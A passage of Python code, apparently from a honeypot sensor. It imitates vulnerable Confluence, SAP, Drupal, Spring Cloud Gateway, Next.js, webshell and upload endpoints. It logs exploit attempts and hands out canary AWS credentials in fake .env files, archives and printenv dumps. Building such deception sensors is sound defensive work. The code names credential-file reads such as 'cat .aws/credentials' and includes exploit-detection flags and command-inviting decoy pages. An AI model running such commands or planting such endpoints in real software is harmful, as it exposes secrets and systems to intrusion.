    has_ognl = _confluence_has_ognl(path, query, body_preview)
    oast_callback = _extract_oast_callback(path)
    if not oast_callback:
        oast_callback = _extract_oast_callback(query)
    if not oast_callback and body_preview:
        oast_callback = _extract_oast_callback(body_preview)

    log_extra: dict[str, object] = {
        "confluencePath": path,
        "confluenceMethod": method,
        "confluenceHasOgnl": has_ognl,
    }
    if oast_callback:
        log_extra["confluenceOastCallback"] = oast_callback[:253]
    if has_ognl:
        # OGNL payloads can run multi-KB; keep the log compact while still
        # carrying enough for triage / sensor-cross-correlation.
        log_extra["confluencePayloadPreview"] = (
            f"{path} | {query} | {body_preview}"
        )[:400]
    if body_preview and not has_ognl:
        # Plain login-form POSTs etc. — keep the preview short.
        log_extra["bodyPreview"] = body_preview[:400]

    # OGNL-injection paths and `*-entervariables.action` / `doenterpagevariables.action`
    # both render the login HTML — that response body is what real
    # Confluence returns when the OGNL expression executes successfully.
    if (
        "${@" in lpath
        or "%24%7b%40" in lpath
        or "createpage-entervariables.action" in lpath
        or "doenterpagevariables.action" in lpath
    ):
        result_tag = "confluence-ognl-probe" if has_ognl else "confluence-action"
        body = render_confluence_login_html(host, CONFLUENCE_VERSION)
        content_type = "text/html; charset=utf-8"
    elif lpath.endswith("/user-dark-features"):
        result_tag = "confluence-dark-features"
        body = render_confluence_dark_features_json()
        content_type = "application/json; charset=utf-8"
    elif lpath.endswith("/templates/editor-preload-container"):
        result_tag = "confluence-editor-preload"
        body = render_confluence_editor_preload_html(CONFLUENCE_VERSION)
        content_type = "text/html; charset=utf-8"
    elif lpath.endswith("/login.action") or lpath in CONFLUENCE_PATHS:
        result_tag = "confluence-login"
        body = render_confluence_login_html(host, CONFLUENCE_VERSION)
        content_type = "text/html; charset=utf-8"
    else:
        # Path matched the matcher (e.g. via the OGNL prefilter) but no
        # specific renderer claimed it — defensive 404 + log so analysis
        # can grep for it.
        append_log({
            **log_context,
            "status": 404,
            "result": "confluence-miss",
            **log_extra,
        })
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    append_log({
        **log_context,
        "status": 200,
        "result": result_tag,
        **log_extra,
        "bytes": len(body),
    })
    return web.Response(
        status=200, body=body,
        headers={
            "Content-Type": content_type,
            # Mirror the X-Confluence-Request-Time header real Confluence
            # emits — gives wicket-aware scanners one more reason to keep
            # going past the login page.
            "X-Confluence-Request-Time": str(int(time.time() * 1000)),
            "Cache-Control": "no-store",
        },
    )


def render_nextjs_page_data(path: str) -> bytes:
    """Plausible response body for a Next.js ISR data fetch. Real
    `_next/data/<buildId>/<page>.json` returns a wrapped pageProps
    object; an empty-but-shaped JSON keeps Next.js-aware scanners
    moving past the fingerprint check without leaking specifics."""
    payload = {
        "pageProps": {},
        "__N_SSG": True,
    }
    return json.dumps(payload).encode("utf-8")


def render_nextjs_static_chunk() -> bytes:
    """`_next/static/chunks/pages/...js` is the build-output chunk; a
    minimal valid JS module is enough to look like a real chunk
    response."""
    body = (
        "(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push("
        "[[404],{}]);\n"
    )
    return body.encode("utf-8")


async def _handle_sap_metadatauploader(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    """Fake SAP NetWeaver Visual Composer MetadataUploader (CVE-2025-31324
    / CVE-2017-9844 bait).

    GET → small SAP-formatted error envelope (real NetWeaver returns the
    same shape when invoked without a multipart body).
    POST → parse multipart parts, log filename/content-type/payload
    indicators, return the "OK: stored …" plaintext receipt scanners look
    for as a "shell installed" success marker. The handler does not
    actually store anything; the follow-up GET to the supposed shell URL
    still hits flux's path classifier and lands in the access log.
    """
    method = request.method
    content_type = request.headers.get("Content-Type", "")
    names: list[str] = []
    filenames: list[str] = []
    part_content_types: list[str] = []
    has_php_shell = False  # reused multipart helper flag; named _php for legacy
    if method not in {"GET", "HEAD"}:
        names, filenames, part_content_types, has_php_shell = extract_multipart_parts(
            request_body, content_type, FILE_UPLOAD_MAX_PARTS,
        )

    body_preview = ""
    if request_body:
        body_preview = request_body[:SAP_METADATAUPLOADER_BODY_DECODE_LIMIT].decode(
            "utf-8", errors="replace",
        )

    lower_body = request_body[:SAP_METADATAUPLOADER_BODY_DECODE_LIMIT].lower() if request_body else b""
    has_jsp_shell = any(needle in lower_body for needle in _SAP_METADATAUPLOADER_SHELL_INDICATORS)
    has_xxe = any(needle in lower_body for needle in _SAP_METADATAUPLOADER_XXE_INDICATORS)

    if method in {"GET", "HEAD"}:
        result_tag = "sap-metadatauploader-probe"
    elif filenames:
        result_tag = "sap-metadatauploader-upload"
    else:
        # POST with no multipart filename — typically a CVE-2017-9844 XXE
        # or a malformed exploit. Distinguish so triage can sort the two.
        result_tag = "sap-metadatauploader-noupload"

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "sapMetadataUploaderPath": path,
        "sapMetadataUploaderMethod": method,
        "sapMetadataUploaderHasMultipart": "multipart/form-data" in content_type.lower(),
        "sapMetadataUploaderPartCount": len(names),
        "sapMetadataUploaderFieldNames": sorted(set(names))[:32],
        "sapMetadataUploaderFilenames": filenames[:32],
        "sapMetadataUploaderPartContentTypes": sorted(set(part_content_types))[:32],
        "sapMetadataUploaderHasJspShell": has_jsp_shell or has_php_shell,
        "sapMetadataUploaderHasXxe": has_xxe,
        "contentType": content_type[:120],
    }
    if body_preview:
        log_entry["bodyPreview"] = body_preview[:400]
    append_log(log_entry)

    headers = {
        # Banner pinned to a build in the CVE-2025-31324 public-disclosure
        # window — scanners deciding whether to ship the upload body don't
        # bail on a patched banner.
        "Server": "SAP NetWeaver Application Server / ABAP (7.50)",
        "Cache-Control": "no-store",
    }

    if method in {"GET", "HEAD"}:
        return web.Response(
            status=200,
            body=render_sap_metadatauploader_get_error(),
            headers={**headers, "Content-Type": "application/xml; charset=utf-8"},
        )

    # POST — return the "OK: stored …" receipt with the (first) uploaded
    # filename echoed back. The receipt path mirrors the documented SAP
    # `j2ee/cluster/apps` layout; scanners parse it to know which URL to
    # GET next for shell execution.
    receipt = render_sap_metadatauploader_post_ok(filenames[0] if filenames else "metadata.xml")
    return web.Response(
        status=200,
        body=receipt,
        headers={**headers, "Content-Type": "text/plain; charset=utf-8"},
    )


async def _handle_drupal(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    query_string: str,
    request_body: bytes,
) -> web.Response:
    """Fake Drupal 8/9 `/user/register` endpoint with CVE-2018-7600
    payload capture.

    GET `/user/register` → minimal Drupal user-registration HTML with
    per-request `form_build_id` and `form_token` values (so a
    follow-up POST passes the framework-level form-cache lookup in a
    real installation).
    POST `/user/register` → Drupal AJAX-form JSON envelope; captures
    the full body (Drupalgeddon2 `mail[#post_render]` / `element_parents`
    chain) and flags `drupalHasDrupalgeddon2` + `drupalHasRcePayload`
    for triage.
    """
    method = request.method
    query_lower = (query_string or "").lower().encode("latin-1", errors="replace")

    body_preview = ""
    if request_body:
        body_preview = request_body[:DRUPAL_BODY_DECODE_LIMIT].decode(
            "utf-8", errors="replace",
        )
    lower_body = request_body[:DRUPAL_BODY_DECODE_LIMIT].lower() if request_body else b""

    has_drupalgeddon2 = any(
        needle in query_lower or needle in lower_body
        for needle in _DRUPAL_DRUPALGEDDON2_INDICATORS
    )
    has_rce_payload = any(needle in lower_body for needle in _DRUPAL_RCE_PAYLOAD_INDICATORS)

    # Result tag picks the most specific applicable shape.
    if method in {"POST", "PUT"}:
        if has_drupalgeddon2 and has_rce_payload:
            result_tag = "drupal-user-register-rce-attempt"
        elif has_drupalgeddon2:
            result_tag = "drupal-user-register-drupalgeddon2"
        else:
            result_tag = "drupal-user-register-post"
    else:
        result_tag = "drupal-user-register-probe"

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "drupalPath": path,
        "drupalMethod": method,
        "drupalHasDrupalgeddon2": has_drupalgeddon2,
        "drupalHasRcePayload": has_rce_payload,
    }
    if body_preview:
        log_entry["bodyPreview"] = body_preview[:400]
    if query_string:
        log_entry["queryPreview"] = query_string[:400]
    append_log(log_entry)

    headers = {
        # The X-Generator response header is the Drupal fingerprint
        # scanners grep when a meta tag would be filtered by an
        # upstream proxy. Mirror Drupal's default banner.
        "X-Generator": f"Drupal {DRUPAL_VERSION} (https://www.drupal.org)",
        "Cache-Control": "no-store, private",
    }

    if method in {"POST", "PUT"}:
        body = render_drupal_ajax_response()
        return web.Response(
            status=200,
            body=body,
            headers={**headers, "Content-Type": "application/json; charset=utf-8"},
        )

    form_build_id = "form-" + secrets.token_urlsafe(20)
    form_token = secrets.token_urlsafe(32)
    body = render_drupal_user_register_html(
        DRUPAL_VERSION, form_build_id, form_token,
    )
    return web.Response(
        status=200,
        body=body,
        headers={**headers, "Content-Type": "text/html; charset=utf-8"},
    )


async def _handle_spring_gateway(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    query_string: str,
    request_body: bytes,
) -> web.Response:
    """Fake Spring Cloud Gateway Actuator surface (CVE-2022-22947 bait).

    GET  `/actuator/gateway/routes`                → fake routes list
        with embedded AWS canary in route metadata.
    GET  `/actuator/gateway/routes/{id}`           → individual route
        echo (same canary content).
    POST `/actuator/gateway/routes/{id}`           → accept SpEL-laden
        body, capture it, return 201 Created.
    POST `/actuator/gateway/refresh`               → 200 OK empty body.
    DELETE `/actuator/gateway/routes/{id}`         → 200 OK.
    GET  `/actuator/gateway/globalfilters`         → fake filter chain.
    GET  `/actuator/gateway/routefilters`          → empty filter set.
    GET  `/actuator/gateway/routepredicates`       → empty predicate set.

    The canary requirement gates the `tracebit_response` injection at
    dispatch time (handler is only reached when `API_KEY` is set —
    matches the `actuator-env` CanaryTrap behaviour).
    """
    method = request.method
    lpath = path.lower().rstrip("/")
    query_lower = (query_string or "").lower().encode("latin-1", errors="replace")

    body_preview = ""
    if request_body:
        body_preview = request_body[:SPRING_GATEWAY_BODY_DECODE_LIMIT].decode(
            "utf-8", errors="replace",
        )
    lower_body = request_body[:SPRING_GATEWAY_BODY_DECODE_LIMIT].lower() if request_body else b""

    has_spel = any(
        needle in query_lower or needle in lower_body
        for needle in _SPRING_GATEWAY_SPEL_INDICATORS
    )

    # Identify which Spring Cloud Gateway sub-endpoint this is.
    is_refresh = lpath.endswith("/gateway/refresh")
    is_globalfilters = lpath.endswith("/gateway/globalfilters")
    is_routefilters = lpath.endswith("/gateway/routefilters")
    is_routepredicates = lpath.endswith("/gateway/routepredicates")
    is_routes_root = (
        lpath.endswith("/gateway/routes")
        and not (
            is_refresh or is_globalfilters or is_routefilters or is_routepredicates
        )
    )
    # `/gateway/routes/{id}` — id is everything after the last `routes/`
    # segment. Empty id = routes_root.
    route_id = ""
    if "/gateway/routes/" in lpath:
        route_id = lpath.rsplit("/gateway/routes/", 1)[-1]

    headers = {
        # Pin a banner inside the CVE-2022-22947 public-disclosure window —
        # Spring Cloud Gateway 3.1.0 is the canonical vulnerable build.
        "Server": "Spring Cloud Gateway/3.1.0",
        "Cache-Control": "no-store",
    }

    if method in {"POST", "PUT"} and route_id:
        result_tag = (
            "spring-gateway-spel-rce-attempt" if has_spel
            else "spring-gateway-route-add"
        )
        body = render_spring_gateway_route_created(route_id)
        log_entry: dict[str, object] = {
            **log_context,
            "status": 201,
            "result": result_tag,
            "springGatewayPath": path,
            "springGatewayMethod": method,
            "springGatewayRouteId": route_id[:120],
            "springGatewayHasSpel": has_spel,
        }
        if body_preview:
            log_entry["bodyPreview"] = body_preview[:400]
        append_log(log_entry)
        return web.Response(
            status=201,
            body=body,
            headers={**headers, "Content-Type": "application/json; charset=utf-8"},
        )

    if method == "DELETE" and route_id:
        append_log({
            **log_context,
            "status": 200,
            "result": "spring-gateway-route-delete",
            "springGatewayPath": path,
            "springGatewayMethod": method,
            "springGatewayRouteId": route_id[:120],
            "springGatewayHasSpel": False,
        })
        return web.Response(
            status=200, body=b"",
            headers={**headers, "Content-Type": "application/json; charset=utf-8"},
        )

    if is_refresh:
        append_log({
            **log_context,
            "status": 200,
            "result": "spring-gateway-refresh",
            "springGatewayPath": path,
            "springGatewayMethod": method,
            "springGatewayHasSpel": has_spel,
        })
        return web.Response(
            status=200, body=render_spring_gateway_refresh_ok(),
            headers={**headers, "Content-Type": "application/json; charset=utf-8"},
        )

    if is_globalfilters:
        body = render_spring_gateway_global_filters()
        append_log({
            **log_context,
            "status": 200,
            "result": "spring-gateway-globalfilters",
            "springGatewayPath": path,
            "springGatewayMethod": method,
            "bytes": len(body),
        })
        return web.Response(
            status=200, body=body,
            headers={**headers, "Content-Type": "application/json; charset=utf-8"},
        )

    if is_routefilters or is_routepredicates:
        # Empty arrays are the real response for stock deployments.
        tag = "spring-gateway-routefilters" if is_routefilters else "spring-gateway-routepredicates"
        append_log({
            **log_context, "status": 200, "result": tag,
            "springGatewayPath": path, "springGatewayMethod": method,
        })
        return web.Response(
            status=200, body=b"{}\n",
            headers={**headers, "Content-Type": "application/json; charset=utf-8"},
        )

    # GET /actuator/gateway/routes — the credential-leak endpoint. Needs
    # a Tracebit AWS canary to embed in the response. Match the
    # CanaryTrap issuance pattern.
    if is_routes_root or route_id:
        # Issue a per-request canary; falls back to a "no canary" envelope
        # if Tracebit is unreachable so we still capture a probe.
        request_id = str(log_context.get("requestId", ""))
        client_ip = str(log_context.get("clientIp", ""))
        host = str(log_context.get("host", ""))
        user_agent = str(log_context.get("userAgent", ""))
        proto = str(log_context.get("protocol", "http"))
        tb = await _get_or_issue_canary(
            ("aws",), client_ip, request_id, host, user_agent, path, proto,
        )
        if tb is None:
            # Without a canary, return the routes list with empty AWS
            # values; the probe still lands in the log.
            tb = {"aws": {"awsAccessKeyId": "", "awsSecretAccessKey": "", "awsSessionToken": ""}}
        body = render_spring_gateway_routes_get(tb)
        tag = "spring-gateway-routes-list" if is_routes_root else "spring-gateway-route-get"
        log_entry = {
            **log_context,
            "status": 200,
            "result": tag,
            "springGatewayPath": path,
            "springGatewayMethod": method,
            "springGatewayRouteId": route_id[:120],
            "canaryTypes": [k for k, v in tb.items() if v],
            "bytes": len(body),
        }
        append_log(log_entry)
        return web.Response(
            status=200, body=body,
            headers={**headers, "Content-Type": "application/json; charset=utf-8"},
        )

    # Anything else under /actuator/gateway/* — log + 404.
    append_log({
        **log_context, "status": 404, "result": "spring-gateway-unknown",
        "springGatewayPath": path, "springGatewayMethod": method,
    })
    return web.Response(
        status=404, body=b"{}\n",
        headers={**headers, "Content-Type": "application/json; charset=utf-8"},
    )


async def _handle_nextjs(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    query_string: str,
    request_body: bytes,
) -> web.Response:
    """Fake Next.js surface that catches server-side-JavaScript
    injection probes via `?cmd=<base64>`. Decodes the payload, logs the
    probe shape, and reflects a simulated `echo` result back when the
    payload contains a literal `var cmd = "echo X"` — designed to
    invite a follow-up exploitation request."""
    body_preview = ""
    if request_body:
        body_preview = request_body[:NEXTJS_BODY_DECODE_LIMIT].decode(
            "utf-8", errors="replace",
        )

    decoded_cmd = _nextjs_decode_cmd_param(query_string)
    has_ssjs = _nextjs_has_ssjs(decoded_cmd) or _nextjs_has_ssjs(body_preview)
    cmd_literal = (
        _nextjs_extract_cmd_literal(decoded_cmd)
        or _nextjs_extract_cmd_literal(body_preview)
    )

    log_extra: dict[str, object] = {
        "nextjsPath": path,
        "nextjsHasSsjs": has_ssjs,
    }
    if decoded_cmd:
        log_extra["nextjsCmdDecoded"] = decoded_cmd[:512]
    if cmd_literal:
        log_extra["nextjsCmdLiteral"] = cmd_literal[:256]
    if body_preview:
        log_extra["bodyPreview"] = body_preview[:400]

    lpath = path.lower()
    if has_ssjs:
        # Reflect a simulated echo so scanner thinks SSJS evaluation
        # worked. Anything other than `echo <safe-token>` falls back to
        # "ERROR" — matches the scanner's own catch-block sentinel and
        # avoids reflecting attacker bytes verbatim.
        result_tag = "nextjs-ssjs-probe"
        body = _nextjs_simulate_command(cmd_literal).encode("utf-8")
        content_type = "text/plain; charset=utf-8"
    elif lpath.startswith("/_next/data/"):
        result_tag = "nextjs-page-data"
        body = render_nextjs_page_data(path)
        content_type = "application/json; charset=utf-8"
    elif lpath.startswith("/_next/static/chunks/pages/"):
        result_tag = "nextjs-static-chunk"
        body = render_nextjs_static_chunk()
        content_type = "application/javascript; charset=utf-8"
    else:
        # `/api/*` route hit without an SSJS payload — return an empty
        # JSON object, the canonical "endpoint exists but returned
        # nothing" shape from a Next.js API route.
        result_tag = "nextjs-api"
        body = b"{}"
        content_type = "application/json; charset=utf-8"

    append_log({
        **log_context,
        "status": 200,
        "result": result_tag,
        **log_extra,
        "bytes": len(body),
    })
    return web.Response(
        status=200, body=body,
        headers={
            "Content-Type": content_type,
            "Cache-Control": "no-store",
            # Set a plausible build-id header — real Next.js does not emit
            # this on every response, but emitting it on the data routes
            # mirrors the shape scanners look for.
            "X-Powered-By": "Next.js",
        },
    )


async def _handle_webshell(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    query_string: str,
    request_body: bytes,
) -> web.Response:
    query_params = parse_qs(query_string, keep_blank_values=True) if query_string else {}
    content_type = request.headers.get("Content-Type", "")
    form_params = parse_form_body(request_body, content_type)
    cookies = parse_cookies(request.headers.get("Cookie", ""))
    command_source, command_key, command = extract_webshell_command(
        query_params, form_params, cookies, request.headers,
    )

    body_preview = ""
    if request_body:
        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode("utf-8", errors="replace")

    output = simulate_command_output(command) if command else ""
    payload = render_webshell_page(command=command, output=output)

    log_entry = {
        **log_context,
        "status": 200,
        "result": "webshell-command" if command else "webshell-probe",
        "webshellPath": path,
        "commandSource": command_source,
        "commandKey": command_key,
        "command": command,
        "simulatedOutputBytes": len(output),
        "cookieNames": sorted(cookies.keys()),
        "queryParamNames": sorted(query_params.keys()),
        "formParamNames": sorted(form_params.keys()),
        "contentType": content_type[:120],
    }
    if body_preview:
        log_entry["bodyPreview"] = body_preview
    append_log(log_entry)

    return web.Response(
        status=200, body=payload,
        headers={
            "Content-Type": "text/html; charset=utf-8",
            "Cache-Control": "no-store",
        },
    )


async def _handle_file_upload(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    """Respond to KCFinder / jquery.filer / blueimp file-upload probe paths.

    GET → return a presence-detection-friendly response per family.
    POST → parse multipart parts (filenames, content-types, php-shell
    indicator) and return a plausible "uploaded" envelope so the scanner
    sends its next request (e.g. fetching the uploaded shell via GET).
    All multipart bytes are already covered by the request envelope's
    bodySha256; this handler adds per-part fields for triage.
    """
    family = _file_upload_family(path)
    method = request.method
    content_type = request.headers.get("Content-Type", "")
    names, filenames, part_content_types, has_php_shell = (
        ([], [], [], False)
        if method in {"GET", "HEAD"}
        else extract_multipart_parts(request_body, content_type, FILE_UPLOAD_MAX_PARTS)
    )
    body_preview = ""
    if request_body:
        # Decoded preview is best-effort — multipart bytes are mostly text
        # in the parts we care about (filenames, php source), and the
        # `replace` errors handler keeps the field safe to JSON-encode.
        body_preview = request_body[:FILE_UPLOAD_BODY_DECODE_LIMIT].decode(
            "utf-8", errors="replace",
        )

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": "file-upload-attempt" if method == "POST" else "file-upload-probe",
        "fileUploadFamily": family,
        "fileUploadPath": path,
        "fileUploadMethod": method,
        "fileUploadHasMultipart": "multipart/form-data" in content_type.lower(),
        "fileUploadPartCount": len(names),
        "fileUploadFieldNames": sorted(set(names))[:32],
        "fileUploadFilenames": filenames[:32],
        "fileUploadPartContentTypes": sorted(set(part_content_types))[:32],
        "fileUploadHasPhpShell": has_php_shell,
        "contentType": content_type[:120],
    }
    if body_preview:
        log_entry["bodyPreview"] = body_preview
    append_log(log_entry)

    # Build per-family response. HEAD shares the GET response shape so
    # the Content-Type advertised is correct; aiohttp strips the body.
    body: bytes
    response_content_type: str
    if family == "kcfinder":
        if method == "POST":
            body = render_kcfinder_upload_response(filenames or ["upload.txt"])
            response_content_type = "text/plain; charset=utf-8"
        elif "browse" in path.lower() or "kcfinder.php" in path.lower():
            body = render_kcfinder_browse_html()
            response_content_type = "text/html; charset=utf-8"
        else:
            # GET to upload.php → return an "ok, ready to receive" page that
            # still references the upload form, so the scanner POSTs next.
            body = render_kcfinder_browse_html()
            response_content_type = "text/html; charset=utf-8"
    elif family == "jquery-filer":
        if method == "POST":
            body = render_jquery_filer_upload_response(filenames)
            response_content_type = "application/json; charset=utf-8"
        elif path.lower().endswith("readme.txt"):
            body = render_jquery_filer_readme()
            response_content_type = "text/plain; charset=utf-8"
        else:
            # GET on /<prefix>/jquery.filer/php/upload.php → JSON empty-OK
            # so scanners that probe with GET-before-POST see a 200.
            body = b'{"OK":1,"files":[]}\n'
            response_content_type = "application/json; charset=utf-8"
    else:
        # blueimp-jquery-file-upload — server/php/ enumerates already-uploaded
        # files on GET (we return an empty list) and accepts POST uploads.
        body = render_blueimp_upload_response(filenames if method == "POST" else [])
        response_content_type = "application/json; charset=utf-8"

    return web.Response(
        status=200, body=body,
        headers={
            "Content-Type": response_content_type,
            "Cache-Control": "no-store",
        },
    )


async def _handle_cmd_injection(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    query_string: str,
    request_body: bytes,
    request_id: str,
) -> web.Response:
    """Respond to admin-config command-injection probes and CGI printenv
    leaks. See the CMD_INJECTION_ENABLED block at the top of this module
    for the design — most cmds get plausible static output, credential-file
    cmds get a fresh Tracebit canary in the response body."""
    method = request.method
    lpath = path.lower()
    is_printenv = lpath in {"/printenv", "/cgi-bin/printenv", "/cgi-bin/test-cgi"}

    query_params = parse_qs(query_string, keep_blank_values=True) if query_string else {}
    content_type_req = request.headers.get("Content-Type", "")
    form_params = parse_form_body(request_body, content_type_req)
    cmd_source, cmd_key, command = extract_cmd_injection_command(query_params, form_params)

    # /printenv-shape paths behave as if the cmd was 'printenv' regardless
    # of any query — that's the whole point of those CGI scripts.
    family = ""
    if is_printenv:
        family = "env"
    elif command:
        family = classify_cmd_injection_command(command)

    # Decide whether to mint a canary. Only the credential-file probes get
    # one; everything else returns static text. Per-IP cache caps the
    # quota burn from repeated `cat .aws/credentials` from the same source.
    needs_canary = family in {"creds-aws", "creds-aws-config", "env"}
    tracebit_response: dict[str, object] | None = None
    canary_status = ""
    client_ip = str(log_context.get("clientIp", ""))
    host = str(log_context.get("host", ""))
    user_agent = str(log_context.get("userAgent", ""))
    proto = str(log_context.get("protocol", ""))

    if needs_canary and API_KEY:
        tracebit_response = await _get_or_issue_canary(
            ("aws",), client_ip, request_id, host, user_agent, path, proto,
        )
        if tracebit_response is None:
            canary_status = "issue-failed"
            # Fall through to a static response — better to look alive
            # than to 502 and tell the scanner to skip us.
            needs_canary = False

    body: bytes = b""
    if family == "creds-aws" and tracebit_response is not None:
        body = render_aws_credentials_ini(tracebit_response)
        canary_status = "issued"
    elif family == "creds-aws-config" and tracebit_response is not None:
        body = render_aws_config_ini(tracebit_response)
        canary_status = "issued"
    elif family == "env" and tracebit_response is not None:
        body = render_printenv_dump(tracebit_response, host=host)
        canary_status = "issued"
    elif family == "passwd":
        body = render_fake_passwd()
    elif family in {"id", "whoami", "hostname", "uname", "pwd", "ls"}:
        body = simulate_command_output(command).encode("utf-8")
    elif command and family == "unknown":
        # Many shells produce no output for builtins / assignments. Empty
        # body avoids leaking a "this is fake" canned error message.
        body = b""
    elif not command and not is_printenv:
        # GET /admin/config with no cmd — return a small landing page so
        # the scanner moves on to its next step instead of bailing.
        body = (
            b"<!doctype html>\n<html><head><title>Admin Config</title></head>"
            b"<body><h1>Admin Configuration</h1>"
            b"<p>Use ?cmd=&lt;command&gt; to inspect runtime state.</p>"
            b"</body></html>\n"
        )

    if is_printenv:
        result_tag = "cmd-injection-printenv"
        content_type = "text/plain; charset=utf-8"
    elif family in {"creds-aws", "creds-aws-config", "env"} and tracebit_response is not None:
        result_tag = "cmd-injection-creds-leak"
        # Mimic the file the cmd asked for.
        content_type = "text/plain; charset=utf-8"
    elif command:
        result_tag = f"cmd-injection-command"
        content_type = "text/plain; charset=utf-8" if family != "" else "text/plain; charset=utf-8"
    else:
        result_tag = "cmd-injection-probe"
        content_type = "text/html; charset=utf-8"

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "cmdInjectionPath": path,
        "cmdSource": cmd_source,
        "cmdKey": cmd_key,
        "cmd": command,
        "cmdFamily": family,
        "method": method,
        "outputBytes": len(body),
    }
    if canary_status:
        log_entry["canaryStatus"] = canary_status
    if tracebit_response is not None:
        log_entry["canaryTypes"] = [k for k, v in tracebit_response.items() if v]
    append_log(log_entry)

    return web.Response(
        status=200, body=body,
        headers={
            "Content-Type": content_type,
            "Cache-Control": "no-store",
        },
    )


async def _send_canary_trap(
    request: web.Request,
    trap: "CanaryTrap",
    request_id: str,
    path: str,
    client_ip: str,
    host: str,
    user_agent: str,
    proto: str,
    log_context: dict[str, object],
) -> web.Response:
    tracebit_response = await _get_or_issue_canary(
        trap.canary_types, client_ip, request_id, host, user_agent, path, proto,
    )
    if tracebit_response is None:
        append_log({**log_context, "status": 502, "result": f"{trap.name}-error"})
        return web.Response(
            status=502, body=b"upstream credential issue failed\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    try:
        body = trap.render(tracebit_response)
    except Exception as exc:  # noqa: BLE001 — render bugs shouldn't crash the sensor
        append_log({
            **log_context, "status": 502, "result": f"{trap.name}-render-error",
            "error": str(exc)[:400],
        })
        return web.Response(
            status=502, body=b"render error\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    response = web.Response(status=200, body=body)
    response.headers["Content-Type"] = trap.content_type
    response.headers["Cache-Control"] = "no-store"
    for header_name, header_value in trap.extra_headers(tracebit_response):
        response.headers[header_name] = header_value

    append_log({
        **log_context,
        "status": 200,
        "result": trap.name,
        "canaryTypes": [k for k, v in tracebit_response.items() if v],
        "bytes": len(body),
    })
    return response


def _build_backup_archive_body(r: dict[str, object], ext_family: str) -> tuple[bytes, str]:
    """Build the response body for a backup-archive trap hit.

    Returns (body_bytes, content_type). The body is a real archive in
    the matching format (gzip / zip / tar / bzip2 / xz) containing a
    fake `.env` + SQL dump with the Tracebit AWS canary embedded.
    For formats with no stdlib creator (`.7z`, `.rar`, `.zst`) we
    serve a tar.gz body under the claimed Content-Type — credential
    harvesters typically grep raw bytes for `AWS_ACCESS_KEY_ID=`
    and replay the canary regardless of whether they could actually
    extract the archive.
    """
    aws = _aws(r)
    db_pw = _fake_db_password()
    env_body = (
        f"AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}\n"
        f"AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}\n"
        f"AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}\n"
        f"AWS_DEFAULT_REGION=us-east-1\n"
        f"S3_BUCKET=prod-backups\n"
        f"DB_HOST=db.internal\n"
        f"DB_USER=appuser\n"
        f"DB_NAME=prod\n"
        f"DB_PASSWORD={db_pw}\n"
    ).encode("utf-8")
    sql_body = (
        f"-- MySQL dump 10.13  Distrib 8.0.35, for Linux (x86_64)\n"
        f"-- Host: db.internal    Database: prod\n"
        f"--\n"
        f"-- S3 backup creds (rotate via Vault; see INFRA-412):\n"
        f"--   AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}\n"
        f"--   AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}\n"
        f"--   AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}\n"
        f"--\n"
        f"LOCK TABLES `users` WRITE;\n"
        f"INSERT INTO `users` VALUES (1,'admin','admin@internal.lan');\n"
        f"INSERT INTO `users` VALUES (2,'deploy','deploy@internal.lan');\n"
        f"UNLOCK TABLES;\n"
    ).encode("utf-8")

    members = ((".env", env_body), ("backup.sql", sql_body))

    def _make_tar(mode: str) -> bytes:
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode=mode) as t:
            for name, content in members:
                ti = tarfile.TarInfo(name=name)
                ti.size = len(content)
                t.addfile(ti, io.BytesIO(content))
        return buf.getvalue()

    if ext_family == "zip":
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            for name, content in members:
                z.writestr(name, content)
        return buf.getvalue(), "application/zip"
    if ext_family in ("tar.gz", "tgz"):
        return _make_tar("w:gz"), "application/gzip"
    if ext_family in ("tar.bz2", "tbz2"):
        return _make_tar("w:bz2"), "application/x-bzip2"
    if ext_family in ("tar.xz", "txz"):
        return _make_tar("w:xz"), "application/x-xz"
    if ext_family == "tar":
        return _make_tar("w"), "application/x-tar"
    if ext_family == "sql.gz":
        return gzip.compress(sql_body), "application/gzip"
    if ext_family == "sql.bz2":
        return bz2.compress(sql_body), "application/x-bzip2"
    if ext_family == "sql":
        return sql_body, "application/sql; charset=utf-8"
    if ext_family == "gz":
        return gzip.compress(env_body), "application/gzip"
    if ext_family == "bz2":
        return bz2.compress(env_body), "application/x-bzip2"
    if ext_family == "xz":
        return lzma.compress(env_body), "application/x-xz"
    if ext_family == "7z":
        return _make_tar("w:gz"), "application/x-7z-compressed"
    if ext_family == "rar":
        return _make_tar("w:gz"), "application/x-rar-compressed"
    if ext_family == "zst":
        return _make_tar("w:gz"), "application/zstd"
    return _make_tar("w:gz"), "application/gzip"


async def _send_backup_archive(
    request: web.Request,
    request_id: str,
    path: str,
    client_ip: str,
    host: str,
    user_agent: str,
    proto: str,
    log_context: dict[str, object],
) -> web.Response:
    """Backup-archive canary trap. Dispatch is gated on `API_KEY` and
    `BACKUP_ARCHIVE_ENABLED`; pattern match runs first via
    `is_backup_archive_path`."""
    ext_family = _backup_archive_match(path)
    tracebit_response = await _get_or_issue_canary(
